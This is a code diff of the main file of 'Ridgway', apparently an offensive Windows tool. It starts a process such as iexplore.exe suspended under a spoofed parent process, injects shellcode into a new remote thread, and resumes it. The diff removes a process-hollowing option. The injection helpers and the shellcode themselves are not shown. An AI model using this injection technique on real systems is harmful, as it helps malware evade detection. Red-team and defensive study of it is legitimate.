@@ -1,111 +1,61 @@
 #include <Windows.h>
+#include <iostream>
+
 #include "stdafx.h"
+#include "ShellcodeInjection.h"
 #include "ParentProcessManipulation.h"
 #include "Ridgway.h"
-#include "ShellcodeInjection.h"
 
-int CreateRemoteThreadMethod(_TCHAR* processName, int parentProcessId)
+
+int CreateRemoteThread(_TCHAR* processName, int parentProcessId)
 {
-	// Start the process suspended with the given parent process ID
 	PROCESS_INFORMATION processInfo = StartProcessSuspended(processName, parentProcessId);
 
 	if (processInfo.dwProcessId == NULL) {
-#ifdef DEBUG
-		getchar();
-#endif
-		return 3;
-	}
-
-	// Inject the shellcode
-	if (!InjectShellcodeIntoNewThread(processInfo)) {
-#ifdef DEBUG
-		getchar();
-#endif
-		return 4;
-	}
-
-	// Resume execution
-	if (!ResumeThread(processInfo.hThread))
-	{
-		DisplayErrorMessage(TEXT("Error resuming thread"), GetLastError());
-#ifdef DEBUG
-		getchar();
-#endif
-		return 5;
-	}
-#ifdef DEBUG
-	getchar();
-#endif
-	return 0;
-}
-
-int ProcessHollowMethod(_TCHAR* processName, int parentProcessId)
-{
-	// Start the process suspended with the given parent process ID
-	PROCESS_INFORMATION processInfo = StartProcessSuspended(processName, parentProcessId);
-
-	if (processInfo.dwProcessId == NULL) {
-#ifdef DEBUG
-		getchar();
-#endif
-		return 3;
-	}
-
-	// Inject the shellcode
-	if (!InjectShellcodeByHollowing(processInfo)) {
-#ifdef DEBUG
-		getchar();
-#endif
-		return 4;
-	}
-
-	// Resume execution
-	if (!ResumeThread(processInfo.hThread))
-	{
-		DisplayErrorMessage(TEXT("Error resuming thread"), GetLastError());
-#ifdef DEBUG
-		getchar();
-#endif
-		return 5;
-	}
-#ifdef DEBUG
-	getchar();
-#endif
-	return 0;
-}
-
-int _tmain(int argc, _TCHAR* argv[])
-{
-	if (argc != 3 && argc != 4)
-	{
-		_tprintf(TEXT("usage: Ridgway.exe <processPath> <parentProcessId> [injectMethod]\n"));
-		_tprintf(TEXT("[injectMethod] is optional:\n"));
-		_tprintf(TEXT("1: Use CreateRemoteThread\n"));
-		_tprintf(TEXT("2: WIP\n"));
 		return 1;
 	}
 
-	int parentProcessId = _tstoi(argv[2]);
-	int injectMethod = 1;
-	if (argc == 4)
-	{
-		injectMethod = _tstoi(argv[3]);
-	}
-
-	switch (injectMethod)
-	{
-	case 1:
-		return CreateRemoteThreadMethod(argv[1], parentProcessId);
-
-	case 2:
-		return ProcessHollowMethod(argv[1], parentProcessId);
-
-	default:
-		_tprintf(TEXT("Unrecognised or unsupported option: %d"), injectMethod);
+	if (!InjectShellcodeIntoNewThread(processInfo)) {
 		return 2;
 	}
 
+	if (!ResumeThread(processInfo.hThread))
+	{
+		DisplayErrorMessage(TEXT("[-] Error resuming thread"), GetLastError());
+		return 3;
+	}
+	return 0;
+}
 
+
+// Usage: Ridgway.exe [optional process path] [optional parent pid]
+// Defaults are C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe and explorer parent pid.
+int _tmain(int argc, _TCHAR* argv[])
+{
+#ifdef DEBUG
+	system("pause");
+#endif
+	
+	TCHAR processPath[500] = TEXT("c:\\Program Files (x86)\\Internet Explorer\\iexplore.exe");
+	auto parentProcessId = -1;
+	
+	if (argc >= 2)
+	{
+		wcscpy_s(processPath, argv[1]);
+		if(argc >= 3)
+		{
+			parentProcessId = _tstoi(argv[2]);
+		}
+	}
+	
+	try
+	{
+		return CreateRemoteThread(processPath, parentProcessId);
+	}
+	catch (const std::exception& e)
+	{
+		std::cout << e.what();
+	}
 }
 
 
